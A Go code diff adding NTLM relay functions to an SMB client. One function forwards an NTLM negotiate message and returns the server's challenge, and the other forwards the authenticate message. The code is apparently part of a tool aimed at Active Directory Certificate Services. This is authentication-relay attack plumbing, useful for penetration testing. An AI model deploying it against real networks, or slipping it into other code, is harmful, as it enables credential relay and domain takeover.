@@ -169,6 +169,58 @@ func (s *smbSession) sessionSetupNTLM(cfg *ADCSConfig) error {
 	return nil
 }
 
+func (s *smbSession) sessionSetupRelayPhase1(ntlmType1 []byte) ([]byte, error) {
+	hdr1 := s.smb2Header(0x0001)
+	body1 := make([]byte, 24)
+	binary.LittleEndian.PutUint16(body1[0:2], 25)
+	secOffset1 := uint16(64 + 24)
+	binary.LittleEndian.PutUint16(body1[12:14], secOffset1)
+	binary.LittleEndian.PutUint16(body1[14:16], uint16(len(ntlmType1)))
+	body1 = append(body1, ntlmType1...)
+	if _, err := s.conn.Write(smbPacket(hdr1, body1)); err != nil {
+		return nil, err
+	}
+	resp1, err := readSMB2Response(s.conn)
+	if err != nil {
+		return nil, err
+	}
+	if len(resp1) >= 48 {
+		s.sessionID = binary.LittleEndian.Uint64(resp1[40:48])
+	}
+	if len(resp1) < 64+24 {
+		return nil, fmt.Errorf("short session setup response")
+	}
+	secOffset := binary.LittleEndian.Uint16(resp1[64+12 : 64+14])
+	secLen := binary.LittleEndian.Uint16(resp1[64+14 : 64+16])
+	if int(secOffset+secLen) > len(resp1) {
+		return nil, fmt.Errorf("security blob offset out of range")
+	}
+	challenge := make([]byte, secLen)
+	copy(challenge, resp1[secOffset:secOffset+secLen])
+	return challenge, nil
+}
+
+func (s *smbSession) sessionSetupRelayPhase2(ntlmType3 []byte) error {
+	hdr2 := s.smb2Header(0x0001)
+	body2 := make([]byte, 24)
+	binary.LittleEndian.PutUint16(body2[0:2], 25)
+	secOffset1 := uint16(64 + 24)
+	binary.LittleEndian.PutUint16(body2[12:14], secOffset1)
+	binary.LittleEndian.PutUint16(body2[14:16], uint16(len(ntlmType3)))
+	body2 = append(body2, ntlmType3...)
+	if _, err := s.conn.Write(smbPacket(hdr2, body2)); err != nil {
+		return err
+	}
+	resp2, err := readSMB2Response(s.conn)
+	if err != nil {
+		return err
+	}
+	if len(resp2) >= 48 {
+		s.sessionID = binary.LittleEndian.Uint64(resp2[40:48])
+	}
+	return nil
+}
+
 func (s *smbSession) sessionSetupAnonymous() error {
 	hdr1 := s.smb2Header(0x0001)
 	body1 := make([]byte, 24)
